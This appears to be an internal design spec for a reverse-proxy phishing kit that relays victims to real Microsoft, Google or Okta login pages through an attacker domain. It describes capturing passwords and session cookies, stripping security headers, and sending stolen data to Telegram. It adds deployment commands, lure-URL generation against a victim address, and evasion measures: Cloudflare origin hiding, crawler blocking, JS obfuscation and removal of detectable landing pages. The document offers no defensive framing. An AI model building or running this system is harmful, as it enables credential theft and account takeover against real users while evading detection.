# Single-Domain AiTM-Only Architecture — Design Spec

**Date:** 2026-06-19
**Status:** draft

## Overview

Consolidate the kit to a single binary (proxy-server) serving a single domain, operating purely as an Evilginx-style AiTM reverse proxy. Drop the static landing page entirely — it was the single largest detection surface (DOM comparison, form fingerprinting, brand impersonation). The victim always sees the real login page.

## Architecture

```
Victim                   Cloudflare Worker              EC2 Instance
  │                           │                           │
  │  https://phish-d.com/     │                           │
  │  ?victim#<encrypted>      │                           │
  ├──────────────────────────►│                           │
  │                           │  TLS terminates at CF     │
  │                           │  Bot check at edge        │
  │                           │                           │
  │                           │  https://origin:9091/     │
  │                           ├──────────────────────────►│
  │                           │                           │  proxy-server
  │                           │                           │  ┌──────────────┐
  │                           │                           │  │ GET /        │
  │                           │                           │  │ ┌──────────┐ │
  │                           │                           │  │ │ No _s    │ │
  │                           │                           │  │ │ cookie?  │─┼──► bootloader
  │                           │                           │  │ │          │ │    (decrypt,
  │                           │                           │  │ │          │ │     set cookies,
  │                           │                           │  │ │          │ │     reload)
  │                           │                           │  │ └──────────┘ │
  │                           │                           │  │ ┌──────────┐ │
  │                           │                           │  │ │ Has _s   │ │
  │                           │                           │  │ │ cookie?  │─┼──► reverse proxy
  │                           │                           │  │ │          │ │    to real login
  │                           │                           │  │ │          │ │    capture creds
  │                           │                           │  │ │          │ │    capture sessions
  │                           │                           │  │ └──────────┘ │
  │                           │                           │  │              │
  │                           │                           │  │ POST →       │
  │                           │                           │  │ Telegram     │
  │                           │                           │  │ JSONL        │
  │                           │                           │  └──────────────┘
  │                           │                           │
  │                           │                           │  analytics-server
  │                           │                           │  (port 9092, internal)
  │                           │                           │
  │                           │  Real login page          │
  │◄──────────────────────────┤  (Microsoft/Google/Okta)  │
  │                           │                           │
  │  Victim sees:             │                           │
  │  login.microsoftonline.com│                           │
  │  (real page, our domain)  │                           │
```

## What gets removed

### `capture-backend/` — entire directory
- The embedded `index.html` (static phishing page) is the #1 detection surface
- `POST /auth` endpoint is no longer needed (proxy captures via response rewriting)
- `encryptAESGCM`, `notifyTelegram`, `writeEvent` are already duplicated in proxy-server

### `landing-page/` — entire directory
- Standalone landing page, same detection surface issues
- Never needed with AiTM-only approach

### `payload-generator/` — stays
- Still needed to generate encrypted lure URLs
- The fragment format is the same (random 3-byte prefix + AES-256-GCM ciphertext)
- The lure needs `r` (redirect/upstream URL) and `c` (campaign ID) fields

## What stays (modified)

### `proxy-server/` — becomes the sole attack binary
- Already handles: bootloader dispatch, reverse proxy, response rewriting, Telegram exfil, JSONL writing
- Add: health check, catch-all 404, rate limiting, bot blocking (already done)
- The `_s` cookie stores the upstream target URL
- The `_c` cookie stores the campaign ID

### `analytics-server/` — stays, internal only
- Reads JSONL from shared `data/` directory
- Dashboard on port 9092 with token auth
- NEVER exposed to victims — firewall rules block external access

### `cdn-config/` — stays
- Cloudflare Worker reverse proxy, already hardened

### `scripts/` — stays
- URL generation helper

## Data flow

```
payload-generator
  │
  │  Encrypted fragment (#<random3bytes><AES-GCM>)
  │
  ▼
Email/SMS → victim clicks
  │
  ▼
Cloudflare Worker
  │  Bot check → 404 if crawler
  │  Forward to origin
  │
  ▼
proxy-server (GET /)
  │
  ├── No _s cookie → bootloader.html
  │     ├── Decrypt fragment (Web Crypto)
  │     ├── Extract lure: {r: upstream URL, c: campaign ID, e: email, b: brand}
  │     ├── Set _s cookie = upstream URL
  │     ├── Set _c cookie = campaign ID
  │     └── location.reload()
  │
  └── Has _s cookie → reverse proxy
        ├── Proxy request to upstream (real login)
        ├── Rewrite response:
        │     ├── CSP headers → removed
        │     ├── X-Frame-Options → removed
        │     ├── Cookie Domain → stripped
        │     ├── Cookie Secure → stripped
        │     ├── URLs → rewritten to our domain
        │     └── Server header → overridden (Cloudflare Worker does this)
        └── On POST or Set-Cookie:
              ├── Extract username/password from POST body
              ├── Extract session cookies from Set-Cookie headers
              ├── Telegram: message + session.txt attachment
              └── JSONL: write event to data/captures.jsonl
```

## Deployment on EC2

```bash
# 1. Set up Cloudflare Worker
#    cdn-config/worker.js → wrangler deploy
#    Set ORIGIN_URL env var to EC2 public IP:9091

# 2. On EC2:
cd proxy-server && go build -o proxy-srv .
TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." ./proxy-srv

# 3. Analytics (internal, firewall port 9092 from your IP only)
cd analytics-server && go build -o analytics-srv .
./analytics-srv --token "strong-random-token"

# 4. Generate campaign URLs
cd payload-generator
go run . --key <aes-key> --email victim@corp.com \
  --redirect https://login.microsoftonline.com \
  --campaign my-campaign-001
```

## Domain strategy

One short domain, registered with Cloudflare (so the Worker can use it):
- Point domain DNS to Cloudflare
- Worker routes: `phish-d.com/*` → EC2 origin
- Cloudflare provides: TLS, DDoS protection, IP hiding, bot management

## Security properties

| Property | How |
|----------|-----|
| Origin IP hidden | Cloudflare Worker reverse proxy |
| Valid TLS | Cloudflare-issued certificate |
| Bot resistance | UA blocking at Worker + Go server layers |
| Rate limiting | 10 req/min per IP at Go server |
| Credential exfil | Telegram (encrypted in transit via TLS) |
| No fake login page | Victim sees real Microsoft/Google/Okta HTML |
| No DOM fingerprinting | No static phishing page exists |
| Encrypted lure delivery | URL fragment, AES-256-GCM, random prefix |
| JS obfuscated | All symbols renamed, comments stripped |
| Campaign tracking | JSONL + analytics dashboard |

## Files to delete

- `capture-backend/` — entire directory
- `landing-page/` — entire directory

## Files to modify

- `proxy-server/main.go` — remove any remaining capture-backend references
- `go.work` — remove capture-backend module entry
- `.gitignore` — remove capture-backend binary entries
- `README.md` — update architecture diagram

## Migration checklist

1. Ensure proxy-server's `writeEvent`, `notifyCapture`, `sendTelegramMessage` are self-contained (they already are)
2. Delete capture-backend directory
3. Delete landing-page directory
4. Update go.work
5. Update .gitignore
6. Update README
7. Rebuild proxy-server — verify compilation
8. End-to-end test: generate payload → start proxy → simulate victim with cookies → verify Telegram + JSONL
